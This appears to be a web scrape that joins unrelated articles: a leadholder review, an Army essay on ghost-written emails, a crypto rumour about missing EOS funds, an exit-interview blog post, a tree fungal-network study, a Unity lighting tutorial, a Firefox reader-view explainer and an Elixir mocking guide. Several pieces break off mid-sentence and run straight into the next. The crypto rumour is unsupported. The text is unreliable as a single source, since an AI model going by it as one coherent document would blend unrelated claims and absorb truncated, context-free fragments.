<p><img src="http://www.penciltalk.org/images/penciltalk.org.kin.7.jpg" alt="Koh-I-Noor 2.0mm leadholders and colour leads"></p>
<p>It has a clip stamped “Koh-I-Noor”. The clip edges are rough to the touch, and appear very cheap.</p>

<p>The cap unscrews and revels four extended blades which form a sharpener. Clever, it works, though not as well as a standard format sharpener.</p>

<p>The 5608 (top photo) is something new. Sleek and svelte, it is really a 2.0mm mechanical pencil in a very portable format. The Toison d’Or’s awkward stamping is replaced with a retro rendering of the Koh-I-Noor name. Nice!</p>
<p><img src="http://www.penciltalk.org/images/penciltalk.org.kin.2.jpg" alt="Koh-I-Noor 2.0mm leadholders and colour leads"></p>
<p>It also has a cap with a four-blade sharpener. Unfortunately, there is a problem. The 5608’s sharpener can’t sharpen the pencil’s lead since the pencil lacks the ability to grip the lead during sharpening – the lead just spins and spins around.  Other blog posts have noted that this problem is shared with other large diameter lead mechanical pencils. This also prohibits the lead from being sharpener with other sharpeners while the lead remains in the pencil.</p>
<p><img src="http://www.penciltalk.org/images/penciltalk.org.kin.3.jpg" alt="Koh-I-Noor 2.0mm leadholders and colour leads"></p>
<p><em>The leads</em></p>
<p>Colour lead in wide lead sizes (2.0, 3.15, and 5.6 mm diameters) can be a great joy – easy to use, and allowing great control. Unfortunately, it can also be hard to find and expensive.</p>
<p><img src="http://www.penciltalk.org/images/penciltalk.org.kin.11.jpg" alt="Koh-I-Noor 2.0mm leadholders and colour leads"></p>
<p>Koh-I-Noor’s leads were a delight to discover, due to the range of colours and the richness of the lines.</p>
<p><img src="http://www.penciltalk.org/images/penciltalk.org.kin.9.jpg" alt="Koh-I-Noor 2.0mm leadholders and colour leads"></p>
<p><img src="http://www.penciltalk.org/images/penciltalk.org.kin.10.jpg" alt="Koh-I-Noor 2.0mm leadholders and colour leads"></p>
<p>For a few days, I thought I had discovered an exceptional stationery item. </p>
<p>Sample marks on both a toothy artist paper from Canson, and a Marumann notebook:</p>
<p><img src="http://www.penciltalk.org/images/penciltalk.org.kin.12.jpg" alt="Koh-I-Noor 2.0mm leadholders and colour leads"></p>
<p><img src="http://www.penciltalk.org/images/penciltalk.org.kin.13.jpg" alt="Koh-I-Noor 2.0mm leadholders and colour leads"></p>
<p>Then something happened. A lead snapped, jamming the containing leadholder. While I’m not an expert, I know this is very odd – leadholders have very simple mechanisms  – they are essentially a “clutch” surrounding a tube for the lead – and they don’t jam. Then another leadholder jammed. Something was very odd about this lead.</p>
<p>I thought the 5608 might be a great document review pencil with a blue lead – but to my frustration, the lead wouldn’t go in the pencil. That was the clue and the answer – this wasn’t really 2.0mm lead!</p>
<p>I took out the micrometer, and a few samples of Koh-I-Noor lead averaged 2.13mm in diameter. For a reference, I tried measuring a Mitsubishi Uni lead sample – that was 2.01mm.</p>
<p><em>The Koh-I-Noor lead is significantly off specification!</em> It won’t fit even in the manufacturer’s own pencil – nor can the lead fit in standard KUM/Staedtler/Faber-Castell lead sharpeners (I have tried). It further creates complications in standard 2.0mm leadholders.</p>
<p>Though the colours are nice, I am very disappointed with this offering. Koh-I-Noor is a mainstay of drafting, drawing, and writing supplies that I admire, but it looks like the design department got the whole budget for these products, while engineering was neglected. </p>

<p>By Joe Byerly<span data-ez-name="fromthegreennotebook_com-box-3"></span></p>
<p>Anyone who has worked directly for a battalion commander or above probably has experience writing “ghost notes.” These are emails a subordinate writes and addresses for their boss to send to other people. Ghost notes can be weekly or monthly sitreps, updates on an ongoing situation or emails asking for additional resources. No matter the type, they are the “easy button” for the commander because all they have to do is hit “send.”</p>
<p>Recently, I worked for a senior Army leader who encouraged his subordinate commanders to own their communications—meaning, write their own emails. As I reflected on his guidance, I realized there are benefits to communications ownership. I witnessed many of these benefits firsthand as I watched him communicate with senior military leaders, senior civilian leaders and his own commanders.<span data-ez-name="fromthegreennotebook_com-medrectangle-3"></span></p>

<p><strong>Greatness and Writing</strong></p>
<p>One of the best ways to work through a problem is to write it down. Throughout history, leaders who found themselves in tough situations sat alone with their thoughts and worked through them using pen and paper.<span data-ez-name="fromthegreennotebook_com-medrectangle-4"></span></p>
<p>Marcus Aurelius, who served as Roman emperor for almost two decades, wrote his <em>Meditations</em> to work through daily leadership challenges, wars and a pandemic. In the week leading up to the D-Day landings, Gen. Dwight Eisenhower wrote himself letters to help work through risks, opportunities and necessities of operations.</p>
<p>Both Marcus and Eisenhower used writing to achieve clarity of thought. This point is underscored by author Stephen King, who has said writing is “refined thinking.” In our minds, our thoughts are clear, but real clarity doesn’t come until those thoughts are solidified in writing. The process of framing an email, capturing important points and discarding nonessential elements helps us gain more clarity.</p>
<p><strong>Sound Authentic</strong></p>
<p>Over the years, I have worked under multiple commanders while in staff positions, and the best ones never let me draft their intent for operations orders. They wanted to own those. At the time, I didn’t understand it—thinking it was one more staff drill I could handle for them. But as I gained experience, I realized they wanted that section of the operations order to reflect their voice.<span data-ez-name="fromthegreennotebook_com-box-4"></span></p>
<p>We all have a voice when we write. This voice is our certificate of authenticity. When commanders write their own correspondence, their voice comes through. When someone else drafts an email, using words and phrases the commander wouldn’t normally use, others can tell someone else wrote it.</p>
<p>Authenticity in communications is important for two reasons. First, subordinates will know if the intent, the guidance, the policy, etc., is the commander’s, or if it is another product produced by staff. They are more likely to follow it and adhere to it when they know it comes directly from the commander’s mind and is not a draft by a random staff officer.</p>
<p>Also, commanders who write their own communications tend to reinforce the message by repeating what they wrote. The senior Army leader I worked for occasionally wrote guidance that he sent out in an email. He then repeated key words and phrases from the document in meetings, during battlefield circulation and in one-on-one discussions. Everyone knew he wrote the email because he owned it and talked about it; his guidance didn’t become memorandums left on a bulletin board in a headquarters.</p>
<p>The second reason authenticity in communications is important is that it signals leader involvement in an issue. I have learned that many senior leaders can tell when a subordinate commander’s email is authentic or a staff-produced ghost note.</p>
<p>Every time there was a change or inflection point in the strategic situation, my boss would provide a one- or two-page update to his commanders. He always wrote these himself, for the reasons mentioned above. I found out from those commanders’ staff members that their bosses read these emails because they knew it was from him, and that if he took the time to write it, they should take the time to read it.</p>
<p>Communication can be frustrating. Sometimes it is like tapping out a song you have in your head and expecting another person to immediately know the tune. It is hard to convey an idea in your head to someone who may not have the same background or experiences as you, or who wasn’t in the same room when you had a conversation.</p>
<p>Communication is a skill that takes practice. We need repetition. Leaders who write their own emails gain needed communication experience when it matters. I have also learned that speed comes with practice. I can write in hours what used to take days.</p>
<p><strong>Honing the Skill</strong></p>
<p>I recognize that commanders have a lot on their plates, and it isn’t feasible for them to spend hours writing and responding to emails. There are many ghost notes best produced by staff in the interest of time. However, when it comes to communicating up or down the chain of command on key issues, or writing guidance on important topics, it is best for commanders to own those.</p>
<p>Great leaders are also great communicators, but the ability to communicate effectively and efficiently takes time to develop. By owning communications, commanders refine and hone this skill. They also have an opportunity to work through problems and refine their thinking through the process of writing. Finally, they gain authenticity in their communications—an important factor in ensuring that “message sent” is “message received.”</p>

<p>Travelers aboard a luxury TransAtlantic cruise have shared pictures that many in the crypto community believe could provide clues on the missing 4 billion dollars raised during the EOS ICO. </p>



<p>DoubleSpend’s own analysis based on the size of the box show that it could very well contain the amount in USDs that was raised in the year-long ICO.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    
      <main><p>Hey Heather, it’s me again.</p>

<p>So I’ve been meaning to write for a while but it’s been difficult. For many
reasons which I won’t lament about here. At least not at the moment. That said,
today I’m writing about exit interviews. You can skip the context and go to <a href="#how-to-escape-the-interview">how
I handled the situation</a> if you just care about
that.</p>

<h2 id="context">Context</h2>

<p>A few years ago, I was asking myself a series of existential questions.
Eventually I decided I was unhappy with my current situation and had to leave my
job. Coincidentally, a colleague had decided the same a week prior (off by one
as developer logic dictates). This meant that I witnessed the process my
colleague went through beforehand and let me tell you, I did <em>not</em> want to go
through <em>that</em>. Let me explain what happened.</p>

<p>So when you work for a large boat institution™, the general process for leaving,
at least in my experience, is as follows:</p>

<ol>
  <li>You have a meeting with your manager to announce you’re leaving</li>
  <li>You hand them a letter or send an email specifying last day</li>
  <li>You have an exit interview with HR</li>
</ol>

<p>This all seemed fine to me until I saw the state my colleague was in after their
exit interview. Without going into specifics I’ll just say that during the
interview, HR persistently asked <a href="https://en.wikipedia.org/wiki/Leading_question">leading questions</a> so that the
answers would have it seem like the primary reason for leaving was a personal
matter and not organizational problems. …</p>

<p>what. the. hell. man.</p>

<p>What’s even the point of skewing this type of information? I don’t know what
type of incentives or motivations HR has but this type of institutional
behavior is insidious. Not only does this conceal internal problems, but it also
damages trust with current employees. People talk.</p>

<p>After seeing how distraught my colleague was after the meeting, I got anxious
and was not looking forward to the invitation. Once I received the invite, I
shared my concern with my manager who said something along the lines of “just do
it”. … <em>whoosh</em>.</p>

<p>This was not the support I needed. So this is what I did instead.</p>

<h2 id="how-to-escape-the-interview">How to escape the interview</h2>

<p>I reached out to HR by email asking them if it was necessary to have the exit
interview and if instead we could find another arrangement. No reply. Again
worried. Then I remembered:</p>

<p>I am an adult and you can’t make me.</p>

<p>The relationship I have with an organization is a professional relationship and
therefore that was how I approached my subsequent actions.</p>

<p>Since I didn’t get a reply to my questions, I declined the invitation and wrote
an email stating that I was not going to partake in the in-person exit interview
but that I would answer questions in writing if they wished to send any. Almost
immediately HR reached out saying they really preferred to talk. I reiterated
that I was declining and that I would answer questions in writing. They
eventually sent a link to an questionnaire. That was basically it.</p>

<h2 id="writing-as-evidence">Writing as evidence</h2>

<p>An important takeaway from this experience was that it’s better to have things
in writing. If the information is being filtered through another person, it’ll
probably have some of their interpretation injected into it. Leading questions
are also less likely to appear in questionnaires.</p>

<p>I’d also recommend keeping a copy of the questions and answers, as well as
copies of all your correspondence with HR and management. You can BCC and
forward emails to your personal inbox so that you have copies if you need to
refer to them after you’ve left.</p>

</ul>

<p>Though past research has focused on seedlings, these findings give new insight into the value of fungal networks to older trees—which are more environmentally beneficial for functions like capturing carbon and stabilizing soil erosion.</p>

<p>“Large trees make up the bulk of the forest, so they drive what the forest is doing,” said researcher Joseph Birch, who led the study for his PhD thesis in the <a href="https://www.ualberta.ca/index.html">Faculty of Agricultural, Life &amp; Environmental Sciences</a>.</p>

<p>When they colonize the roots of a tree, fungal networks act as a sort of highway, allowing water, nutrients and even the compounds that send defence signals against insect attacks to flow back and forth among the trees.</p>

<p>The network also helps nutrients flow to resource-limited trees “like family units that support one another in times of stress,” Birch noted.</p>

<p>Cores taken from 350 Douglas firs in British Columbia showed that annual tree ring growth was related to the extent of fungal connections a tree had with other trees. “They had much higher growth than trees that had only a few connections.”</p>

<p>The research also showed that trees with more connections to many unique fungi had much greater growth than those with only one or two connections.</p>

<p>“We found that the more connected an adult tree is, the more it has significant growth advantages, which means the network could really influence large-scale important interactions in the forest, like carbon storage. If you have this network that is helping trees grow faster, that helps sequester more carbon year after year.”</p>

<p>It’s also possible that if the trees grow faster, they’d have some ability to better survive drought that is expected to intensify with climate change, he added.</p>

<p>“These networks may help them grow more steadily even as conditions become more stressful, and could even help buffer trees against death.”</p>

<p>Birch hopes his findings lead to further studies in different kinds of forests in other geographical areas, because it’s likely that the connections among trees change from year to year, he said.</p>

<p>“It’s a very dynamic system that is probably being broken apart and re-formed quite a bit, like family relationships, so we don’t know how they will change under future climates either. Maybe a dry year or a beetle outbreak impacts the network.</p>

<p>“Knowing whether fungal networks are operating the same way in other tree species could factor into how we reforest areas after harvesting them, and it could inform how we want to plant trees to preserve these networks.”</p>

<p>The research was supported by the <a href="https://www.nserc-crsng.gc.ca/index_eng.asp">Natural Sciences and Engineering Research Council of Canada</a>.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>While most Software Engineers interested in game development will be most
excited about the <em>programming</em> aspect of making a game, you’ll need <em>some</em>
familiarity with graphics, animation, and sound to be successful. This is
especially true if you’re trying to work solo. While a wealth of assets and
resources are available in the
<a href="https://assetstore.unity.com/top-assets/top-download?aid=1011leWs6">Asset Store</a>
(especially when it comes to reasonably-priced
<a href="https://assetstore.unity.com/top-assets/top-paid?aid=1011leWs6">paid assets</a>),
there’s a decent amount you <em>still</em> need to know to execute well when putting
these resources together. In this installment, we’ll discuss Rendering, Render
Pipelines, and Lighting in Unity.</p><p><em>This is <strong><a href="https://blog.eyas.sh/tag/unity-for-software-engineers">Unity for Software Engineers</a></strong>,
a series for those seeking an accelerated introduction to game development in
Unity. More is coming over the next few weeks, so

and <em>faces</em>) into a 3D rendered image. Shaders are parameterized with any number
of properties, such as a <em>texture</em> image representing the surface’s appearance,
normal maps representing finer bumps on the mesh, and much more. The shader code
you write determines what kind of properties it receives if any.</p><p>In Unity, each <em>Rendering Pipeline</em> (discussed below) comes with its own set of
standard shaders. All rendering pipelines include a “Simple Lit” shader as the
most common shader, which helps render an object affected by lighting. In all
pipelines, the Simple Lit variation takes in a <em>base</em> color <em>or</em> texture, a
normal map, a smoothness map, and physically-based rendering inputs like
metallic and specular values as properties.1</p><p>A <strong>Material</strong> is effectively <em>an <strong>instance</strong> of a Shader</em>. It is an <em>Asset</em>
that uses a specific shader and defines all relevant input <em>properties</em> on that
Shader.</p><figure><p><span>

have a <em>Renderer</em> component. There are multiple renderer components available,
but in 3D game design, you’ll most often be using the <em>Mesh Renderer</em>.</p><figure><p><span>

<em>Sphere</em>, <em>Capsule</em>, and others will automatically include:</p><ul><li>A Mesh Renderer component, linked to a default <em>Simple Lit</em> material</li><li>An appropriate Collider component (“Box Collider” for a cube, “Sphere
Collider” for a sphere, etc.), sized precisely to the object, and</li><li>A <em>Mesh Filter</em> component, which defines the Mesh the Renderer should use.</li></ul><p>A <strong>Mesh</strong> is effectively Unity’s term for a 3D model. A Mesh is an <em>asset</em>
containing a description of an object’s <em>vertices</em> and <em>faces</em>. A mesh defines a
“swatch” of materials for each face. This way, you can have meshes (e.g., for an
entire building) where all exterior, floor, wall, and window materials are
described as separate materials. A Mesh doesn’t specify <em>what the materials are</em>
per se, but just that a given collection of faces have the same material.</p><p>When a mesh is selected in a Mesh Filter component, the Renderer’s <em>Materials</em>
array property can be used to hook up each material. If you mis-order your
materials in the above example, you can end up with a glass building and brick
windows. Unity’s primitive meshes only use a single material throughout all
faces of an object.</p><h2>Rendering Pipelines</h2><p>In Unity, a
<a href="https://docs.unity3d.com/Manual/render-pipelines.html">Render Pipeline</a> is the
system responsible for the end-to-end rendering of a scene. Historically, Unity
came with a single general-purpose system known as the <strong>Built-in Render
Pipeline</strong>. Starting with Unity 2018, Unity introduced the <strong>Scriptable Render
Pipeline</strong> (<strong>SRP</strong>) technology. Two SRP-based pipelines are included with
Unity:</p><ul><li>The <strong>Universal Render Pipeline</strong> (<strong>URP</strong>): A lightweight, high-performance
pipeline that is easy to use and broadly cross-platform. It is great for any
platform, including PC, Mobile, and Nintendo Switch. URP was previously
known as the <em>Lightweight Render Pipeline</em> (<em>LWRP</em>).</li><li>The <strong>High Definition Render Pipeline</strong> (<strong>HDRP</strong>): A high-quality pipeline
for high-end platforms. It is particularly great for highly photorealistic
games on beefier PCs and consoles.</li></ul><p>URP is intended to replace the Built-in Render Pipeline as Unity’s
out-of-the-box default. While URP has graduated out of beta, it’s <em>not quite
there yet</em> in terms of 1:1 feature parity. This may or may not matter to you.</p><h3>What Should I Start Using Today?</h3><p>The thing to note is that each rendering pipeline comes with <em>its own set of
shaders</em> (HDRP’s <em>Lit</em> shaders can be significantly more complex than URP’s, for
example). The SRP transition also changed how Unity shaders are written, meaning
that custom shaders written for the old Built-in render pipeline aren’t
compatible with SRP and must be manually ported to SRP. This means that Unity’s
<a href="https://assetstore.unity.com/top-assets/top-download?aid=1011leWs6">ecosystem of assets</a>
became fragmented and individual assets need to put work to support SRP. This is
fairly easy for assets that use simple shaders, but assets with custom shaders
will need to support URP and HDRP explicitly.</p><p>We’re at a point where:</p><ul><li>URP is the future and is <em>easier to use</em></li><li>The Built-in render pipeline is likely <em>good enough</em> and will give you a
more comprehensive selection of compatible assets</li><li>HDRP is hard to use for someone just starting, but probably a good platform
to invest time in if you’re interested in graphically striking games</li></ul><p>If you’re starting development today because you want to <strong>learn</strong> and
<strong>experiment</strong>, I suggest you start with <strong>URP</strong>. Other than limited assets, URP
<em>currently</em> has some limitations with <em>grass</em> and <em>trees</em>.</p><p>If you’re starting development today because you have a <strong>concrete game idea you
want to finish within the next year or so</strong>, I suggest you start with the
<strong>Built-in</strong> render pipeline. You’ll miss out on learning the ”<em>right way</em>” of
doing things in the future, but you’ll likely have a less frustrating
experience.</p><p>I recommend <strong>URP</strong> if you’re starting today with the primary goal of <em>learning</em>
because:</p><ul><li>SRP usually <em>makes sense</em> if you’re starting from scratch;</li><li>If there’s a way to do something in URP, it’s more likely to be fairly
obvious. If you find yourself trying to get something to work that doesn’t
seem to, chances are it’s just not yet supported.</li></ul><p>This advice is hotly contested, though, so your mileage may vary.</p><h2>Lighting</h2><p>When I started with Unity, I expected to spend approximately ~0 minutes worrying
about lighting. It turns out that I underestimated two things: (a) the
difference good lighting makes in what my scene can look like, and (b) how hard
it is to have lighting that is both <em>good</em> and <em>performant</em>. By the way, I
highly recommend

section of their user manual.</p><figure><p><span>

Some of it is absorbed, and some of it scatters. An object in the shade will
still be visible, even though no direct light shines on it from the sun.
Computers can simulate a very realistic rendering using <em>ray tracing</em>, which
imitates the physics of light. But rendering an entire scene with ray tracing is
quite expensive, and broadly speaking, it can not be done reliably in real-time.</p><p>In the real-time context of a game, there are different strategies to deal with
light. Let’s describe a few of these concepts:</p><h3><em>Direct</em> and <em>Indirect</em> Lighting</h3><p>If a light ray leaving its source bounces on an object exactly once and reaches
the camera, the light is <em>direct</em>. The part of the object that the light bounced
off of is directly lit. This light is easy to compute, given the color,
intensity, and distance of the light and the physical properties of the
material.</p><p>Direct lighting and shadows due to a direct light are reasonably quick to
compute. Depending on the rendering pipeline, however, an object lit by
<em>multiple lights</em> in real-time will be rendered over multiple passes (one for
each light). Unity, for instance, will limit the maximum number of direct lights
that can influence an object.</p><p>Indirect lighting, on the other hand, is any <em>other</em> light that reaches the
camera. This is light that has bounced off any number of surfaces before
reaching us. Light coming directly or indirectly from a 3D scene’s skybox, which
is somewhat emissive, (imitating the scattered light throughout the sky that
illuminates the world) will contribute to indirect lighting.</p><p>Indirect lighting is crucial in rendering a realistic scene. Imagine a cube in a
daylight 3D scene. The faces of the cube in shadow should <em>not</em> appear
completely black.</p><p>For example, in the figure above, the left side predominantly shows shaded faces
of our 3D objects. Only <em>direct</em> lights are accounted for in the top-left
corner, thus making the objects appear excessively dark and hard to tell apart.</p><h3>Global Illumination</h3><p>A scene’s <em>global illumination</em> (GI) represents the totality of light from all
sources. Unity offers no supported way to compute global illumination in real
time<sup id="fnref-1"><a href="#fn-1">1</a></sup>, and instead provides a <strong>Baked Global Illumination</strong> system that uses
a few techniques that work together to produce GI:</p><ol><li><strong>Lightmap…</strong></li></ol></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <p> Reader view is Firefox's answer bloated websites and content-filled websites with non-readable content, but how does it function underneath? </p> <p> The main crux is utilizing a big bag of heuristics and knowledge about how semantic HTML elements <i>should</i> be used and structured to strip the page of content that offers no immediate relevance to the reader. All this while also making the font size bigger and more readable, and the page more distraction-free. </p> <p> If you haven't tried it out (and are still sticking with Firefox), please do! If you have, then welcome to an episode of how does it work (with more code than usual). </p> <p> The reader view code is in <a href="https://github.com/mozilla/readability">a library form on Mozilla's Github</a> and is pure Javascript. The code is split into modules for checking the readability of a page (<b>Readability-readerable.js</b>) and the actual conversion of a document to reader view (<b>Readability.js</b>). </p> <p> The conversion function takes in the <code>document</code> and pushes out the article title, HTML string of processed article content, length of an article, in characters, article description (or excerpt automatically extracted from the content), and author metadata (<code>byline</code>). The whole process is a bit heuristical in approach as can be seen in for example <a href="https://github.com/mozilla/readability/blob/52ab9b5c8916c306a47b2119270dcdabebf9d203/Readability.js#L116">hardcoding of site names and attributes</a>, <a href="https://github.com/mozilla/readability/blob/52ab9b5c8916c306a47b2119270dcdabebf9d203/Readability.js#L652"> calculation of title similarities using the length difference</a>, and <a href="https://github.com/mozilla/readability/blob/52ab9b5c8916c306a47b2119270dcdabebf9d203/Readability.js#L1944">node removal thresholds</a>, but in a crude sense the codebase <i>feels</i> pragmatic. Almost industrial. Thankfully nobody has decided to call the if statements with arbitrary numeric thresholds machine learning yet. </p> <p> Retrieving the title from article is simple enough; just get the page title or alternatively whatever metadata we're trying to push using <a href="https://www.dublincore.org/">Dublin Core</a> (<code>dc:title</code>), Twitter (<code>twitter:title</code>), Open Graph (<code>og:title</code>), or Weibo (<code>weibo:title</code>). What was ever wrong with just <code>&lt;title&gt;</code>? Anyway, as long as we got some title-like property we can move on. Next up, excerpt and author metadata. </p> <p> Getting author information a.k.a. byline relies primarily on either on the correct appearance two attribute=value pairs <code>rel=author</code> or <code>itemprop=author</code>, or <a href="https://github.com/mozilla/readability/blob/52ab9b5c8916c306a47b2119270dcdabebf9d203/Readability.js#L125">a regexp soup matching potential byline matches</a>. Even in this blog where I decided to go fancy with a misused <code>&lt;address&gt;</code> attribute for the author information (or lack thereof), Readability finds the information due to the classname <code>class="author"</code>. </p> <p> Excerpt isn't quite as fancy. Extracting the extract primarily relies on finding a meta tag for description similarly to how title was retried (with all the accompanying social media site tags), but if all else fails, the code falls back to retrieving the first paragraph of the text content and trimming it. </p> <p> Reader view is an example of very pragmatic solve-a-real-problem coding, hopefully resulting in a zen-like reading experience for the reader. Even with its beautiful goal, we can only hope that as a tool Reader view will become less useful as sites start adapting more reader-friendly approaches. </p> <p> If you're a website owner and concerned about reader view (or lacking reader view), here's a few tools to hopefully help with that. </p> <h2 id="score-checker">Readability score checker</h2> <p> This checker allows you to check the score your page would get from Mozilla's reader view readability algorithm. The default contents are this page's source. </p> <p> Paste your page's HTML source (right click -&gt; View page source) in the following text area. If your page renders HTML with Javascript (using e.g. React or fetching data from server on load), you might have to use Devtools to get the rendered HTML (<code>document.documentElement.outerHTML</code> is a quick method for essentially whole page HTML). </p>  <h2 id="want-reader-view">I want reader view, and don't have it :(</h2> <p> The reader view algorithm has a few pitholes your site might fall into. We'll go from the most to the least likely: </p> <ol> <li> Are you using <code>&lt;p&gt;</code>, <code>&lt;pre&gt;</code>, or <code>&lt;div&gt;</code> with immediate <code>&lt;br&gt;</code> children for your text content? <ul> <li> These are the only elements readability algorithm uses to determine the readability of your page </li> </ul> </li> <li> Is the content inside those nodes long enough? <ul> <li> Readability algorithm only starts incrementing your readability score after the node contents hit 140 characters. </li> <li> After 140 characters, the score is increased with the logarithmic <code>sqrt(textContentLength - 140)</code> formula, so two paragraphs of ~150 characters is better than one paragraph of ~300 characters. </li> </ul> </li> <li> Are the text paragraphs hidden or considered unlikely text candidates by the algorithm? <ul> <li> Make sure paragraph is hidden neither by <code>display: none</code> or <code>aria-hidden</code> </li> <li> Avoid the classnames listed <a href="https://github.com/mozilla/readability/blob/master/Readability-readerable.js#L27">here</a> in your text paragraphs </li> </ul> </li> </ol> <h2 id="hate-reader-view">I have reader view, but don't want it!</h2> <p> Let's play devil's advocate for a while. On many websites reader view allows you to essentially skip the paywalls and advertisements sprinkled alongside the article. Therefore, for a publisher it might make sense to actively try to get <i>rid</i> of the reader view. </p> <p> The easiest method would be to just get rid of all <code>p</code>, <code>pre</code>, and <code>div</code> with <code>br</code> tags, but this might cause a lot of effort in restyling everything. Way easier way is to use one of the hardcoded exceptions that Mozilla has added for non-viable readability elements; for instance, any node with class <code>skyscraper</code> is considered hidden (maybe the logic is that those elements are shrouded by clouds). </p> <p> We can achieve this on any page with the following snippet. <code> // Reader view disabler 9000 [...document.querySelectorAll("p,pre"), ...[...document.querySelectorAll("div &gt; br")].map(e =&gt; e.parentNode)] .forEach(e =&gt; e.classList.add("skyscraper")); </code> </p>    </div></div>]]>

		<p>I’ve been working with Elixir for 3 years full-time now and while I think it’s an exceptional language and development environment, the testing story always felt incomplete to me. Something was missing. In this post, I’ll explain what that is and how I attempted to fix it.</p>
<h2 id="injecting-mocks">Injecting Mocks</h2>
<p>While I strive to minimize the use of mocks, I find they are still quite useful in certain situations.</p>
<p>Before Elixir, I’ve mainly worked with Java. For better or worse, in Java you have a multitude of options to inject dependencies into your classes. Most notably, <code>@Autowired</code> that allows you to simply override annotated fields during testing with your mock. Could not be simpler.</p>
<p>In Elixir things are a little different. That’s because Elixir does not have classes or class fields. Modules are <em>stateless</em>. So how does one inject a dependency in Elixir?</p>
<p>Let’s look at this simplified example and explore our options:</p>
<div><pre><code data-lang="elixir"><span>defmodule</span> <span>Conversation</span> <span>do</span>
  <span>def</span> <span>start</span><span>(),</span> <span>do</span><span>:</span> <span>English</span><span>.</span><span>greet</span><span>()</span>
<span>end</span>
</code></pre></div><h2 id="-function-arguments">🛑 Function Arguments</h2>
<p>The easiest approach does not require any libraries: passing-in dependencies using the function arguments.</p>
<div><pre><code data-lang="elixir"><span>defmodule</span> <span>Conversation</span> <span>do</span>
  <span>def</span> <span>start</span><span>(</span><span>lang_mod</span> <span>\\</span> <span>English</span><span>),</span> <span>do</span><span>:</span> <span>lang_mod</span><span>.</span><span>greet</span><span>()</span>
<span>end</span>
</code></pre></div><div><pre><code data-lang="elixir"><span>defmodule</span> <span>MyTest</span> <span>do</span>
  <span>use</span> <span>ExUnit.Case</span><span>,</span> <span>async</span><span>:</span> <span>false</span>

  <span>test</span> <span>"start/0"</span> <span>do</span>
    <span>defmodule</span> <span>EnglishMock</span> <span>do</span>
      <span>def</span> <span>greet</span><span>(),</span> <span>do</span><span>:</span> <span>"g'day"</span>
    <span>end</span>
    <span>assert</span> <span>Conversation</span><span>.</span><span>start</span><span>(</span><span>EnglishMock</span><span>)</span> <span>==</span> <span>"g'day"</span>
  <span>end</span>
<span>end</span>
</code></pre></div><p>While many (including myself) find this to look “odd” at first, it is admittedly easy to do.</p>
<p>However, it comes with quite a few drawbacks:</p>
<ol>
<li>Your application code is now littered with testing concerns.</li>
<li>Navigation in your code editor doesn’t work as well.</li>
<li>Searches for usages of the module are more difficult.</li>
<li>The compiler is not able to warn you in case <code>greet/0</code> doesn’t exist on the <code>English</code> module.</li>
</ol>
<h2 id="-global-override">🛑 Global Override</h2>
<p>The Elixir library <a href="https://hex.pm/packages/mock">mock</a> (wrapping the Erlang library <a href="https://hex.pm/packages/meck">meck</a> under the hood) allows overriding any module globally.</p>
<div><pre><code data-lang="elixir"><span>defmodule</span> <span>MyTest</span> <span>do</span>
  <span>use</span> <span>ExUnit.Case</span><span>,</span> <span>async</span><span>:</span> <span>false</span>   <span># not concurrently!</span>

  <span>import</span> <span>Mock</span>

  <span>test</span> <span>"start/0"</span> <span>do</span>
    <span>with_mock</span> <span>English</span><span>,</span> <span>[</span><span>greet</span><span>:</span> <span>fn</span><span>()</span> <span>-&gt;</span> <span>"g'day"</span> <span>end</span><span>]</span> <span>do</span>
      <span>assert</span> <span>Conversation</span><span>.</span><span>start</span><span>()</span> <span>==</span> <span>"g'day"</span>
    <span>end</span>
  <span>end</span>
<span>end</span>
</code></pre></div><p>Here the <code>English</code> module is temporarily replaced with a mock that stubs out the <code>greet</code> function. So far so good - but it comes with a cost. One of ExUnit’s most valuable features is the ability to run tests <em>concurrently</em>. However, to stub out modules <em>globally</em> we have to exempt this test module from being run concurrently (notice the <code>async: false</code>). This might seem like a small price to pay but if your application grows you might soon find yourself with a slow test suite. This can easily be avoided!</p>
<h2 id="-configuration-lookup">🛑 Configuration Lookup</h2>
<p>The more or less official mocking library for Elixir is <a href="https://hex.pm/packages/mox">mox</a>.</p>
<div><pre><code data-lang="elixir"><span># in test_helper.exs</span>
<span>Mox</span><span>.</span><span>defmock</span><span>(</span><span>EnglishMock</span><span>,</span> <span>for</span><span>:</span> <span>English</span><span>)</span>
<span>Application</span><span>.</span><span>put_env</span><span>(</span><span>:myapp</span><span>,</span> <span>:english</span><span>,</span> <span>EnglishMock</span><span>)</span>
</code></pre></div><div><pre><code data-lang="elixir"><span>defmodule</span> <span>Conversation</span> <span>do</span>
  <span>def</span> <span>start</span><span>(),</span> <span>do</span><span>:</span> <span>english</span><span>()</span><span>.</span><span>greet</span><span>()</span>
  <span>defp</span> <span>english</span><span>(),</span> <span>do</span><span>:</span> <span>Application</span><span>.</span><span>get</span><span>(</span><span>:myapp</span><span>,</span> <span>:english</span><span>,</span> <span>English</span><span>)</span>
<span>end</span>
</code></pre></div><div><pre><code data-lang="elixir"><span>defmodule</span> <span>MyTest</span> <span>do</span>
  <span>use</span> <span>ExUnit.Case</span><span>,</span> <span>async</span><span>:</span> <span>true</span>  <span># concurrently!</span>

  <span>import</span> <span>Mox</span>

  <span>test</span> <span>"start/0"</span> <span>do</span>
    <span>stub</span><span>(</span><span>English</span><span>,</span> <span>:greet</span><span>,</span> <span>fn</span> <span>-&gt;</span> <span>"g'day"</span> <span>end</span><span>)</span>
    <span>assert</span> <span>Conversation</span><span>.</span><span>start</span><span>()</span> <span>==</span> <span>"g'day"</span>
  <span>end</span>
<span>end</span>
</code></pre></div><p><code>mox</code> provides a mock that is “injected” into the module under test by doing a lookup in the app’s configuration.</p>
<p>The advantage is that the “odd” function parameter is gone, but all of the other issues are still there. But at least it can be run concurrently since the mock is set up <em>per process</em> (and each test module is its own process in ExUnit).</p>
<h2 id="-rewire">🎉 rewire</h2>
<p>I wasn’t satisfied with any of these options. So I experimented a little with Elixir metaprogramming and the result was <a href="https://hex.pm/packages/rewire">rewire</a>.</p>
<p>It focuses purely on dependency injection and can be used with any mocking library, like <code>mox</code>.</p>
<div><pre><code data-lang="elixir"><span># in test_helper.exs</span>
<span>Mox</span><span>.</span><span>defmock</span><span>(</span><span>EnglishMock</span><span>,</span> <span>for</span><span>:</span> <span>English</span><span>)</span>
